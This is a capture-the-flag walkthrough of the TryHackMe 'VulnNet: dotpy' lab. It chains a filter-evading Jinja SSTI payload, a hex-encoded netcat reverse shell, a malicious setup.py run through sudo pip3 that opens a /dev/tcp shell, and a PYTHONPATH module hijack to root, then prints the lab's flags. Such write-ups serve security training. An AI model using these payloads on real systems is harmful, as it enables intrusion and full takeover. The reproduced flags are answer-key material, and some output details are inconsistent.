# TRYHACKME VulnNet: dotpy MACHINE - Complete Exploitation Walkthrough

**IP:** 10.10.47.50  
**Date:** November 22, 2025  
**Difficulty:** medium  

---

## TABLE OF CONTENTS
1. Reconnaissance & Enumeration
2. Initial Access
3. Lateral Movement
4. Privilege Escalation
5. Capturing the flags

---

## PHASE 1: RECONNAISSANCE & ENUMERATION

### Step 1: Port Scanning

```bash
rustscan -a 10.10.47.50
```

**Results**
```
Open 10.10.47.50:8080
....
```

---

### Step 2: Web Server Enumeration

```bash
curl http://10.10.47.50:8080/
```

**Finding:** Basic login page

---

### Step 3: Create User and Login

**Finding** Market Analysis Dashboard

---

### Step 4: Finding and Exploiting SSTI Vulnerability

```bash
curl http://10.10.47.50:8080/index7
```

**Result**
```
<h2>SORRY!</h2>
<h3 class="font-weight-light">The page you’re looking for was not found.</h3>
<b>No results for <b> index1 </b>
```

**Finding** Our endpoint is being replayed back to us

A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

```bash
curl http://10.10.47.50:8080/index{{7*7}} 
```

**Result**
```
<h2>SORRY!</h2>
<h3 class="font-weight-light">The page you’re looking for was not found.</h3>
<b>No results for <b> index49 </b>
```

**Finding** The server is vulnerable to SSTI

There are a couple of payloads that can be used to get Command Injection but the server detects bad characters so I used payload to see which are seen as bad characters

**Payload**
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

**Result**
```
<h2>SORRY!</h2>
<h3 class="font-weight-light">The page you’re looking for was not found.</h3>
<b>No results for <b> indexuid=1001(web) gid=1001(web) groups=1001(web) </b>
```

---

## PHASE 2: Initial Access

### Step 1: Using the SSTI to get shell

```bash
curl http://10.10.47.50:8080/index{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x31\x30\x2e\x32\x31\x2e\x31\x31\x2e\x32\x33\x31\x20\x31\x33\x33\x37\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```

**Result**
```
nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.21.11.231] from (UNKNOWN) [10.10.47.50] 48572
Linux ip-10-10-213-87 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:33:14 up 42 min,  0 users,  load average: 0.35, 0.12, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(web) gid=33(web) groups=33(web)
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
$ 
```

### Step 2: Enumeration

```bash
web@vulnnet-dotpy:/tmp$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```
---

### Step 3: Exploitation

We are allowed to run arbitrary Python code as a privileged user through package installation, Since we control what package gets installed (* wildcard).

**POC**
1. Create a malicious package with backdoor code
2. Make pip3 run your code as system-adm (privileged user)
3. Use those privileges to get root access

---

## PHASE 3: Lateral Movement

### Step 1: From web user to system_adm

```bash
web@vulnnet-dotpy:/tmp$ TF=$(mktemp -d)

web@vulnnet-dotpy:/tmp$ cat > $TF/setup.py << 'EOF'
from setuptools import setup
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")

setup(
    name="pwn",
    version="0.1",
    py_modules=["dummy"]
)
EOF

sudo -u system-adm /usr/bin/pip3 install $TF
```

**Result**
```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.21.11.231] from (UNKNOWN) [10.10.47.50] 48572
Linux ip-10-10-213-87 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:33:14 up 42 min,  0 users,  load average: 0.35, 0.12, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(system-adm) gid=33(system-adm) groups=33(system-adm)
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
system-adm@vulnnet-dotpy:/tmp/pip-p1o9whzg-build$
```

---

## PHASE 4: Privilege Escalation

### Step 1: Privilege Escalation to root

```bash
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

We are allowed to run a Python script as ROOT, and we are also allowed to control the environment variables that Python uses.

Because of this, we can:

- Trick Python into loading our own malicious code
- Before it loads the real system modules using PYTHONPATH
- And our malicious code runs as root

**POC**
1. Create a fake zipfile.py
2. Put malicious code inside
3. Make Python load it first
4. That code runs as root

```bash
system-adm@vulnnet-dotpy:/tmp$ mkdir pwn
system-adm@vulnnet-dotpy:/tmp$ cd pwn
system-adm@vulnnet-dotpy:/tmp/pwn$ touch zipfile.py
system-adm@vulnnet-dotpy:/tmp/pwn$ nano zipfile.py 
system-adm@vulnnet-dotpy:/tmp/pwn$ cat zipfile.py 
import os

os.execl("/bin/bash", "bash")

system-adm@vulnnet-dotpy:/tmp/pwn$ sudo PYTHONPATH=/tmp/pwn /usr/bin/python3 /opt/backup.py
```

**Result**

```bash
root@vulnnet-dotpy:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## PHASE 5: Capturing the Flags

### Step 1: Obtain the Flags

```bash
cat /home/system-adm/user.txt
cat /root/root.txt
```

**User Flag** THM{91c7547864fa1314a306f82a14cd7fb4}  
**Root Flag** THM{734c7c2f0a23a4f590aa8600676021fb}

---

## Congrats! You've rooted VulnNet: dotpy!
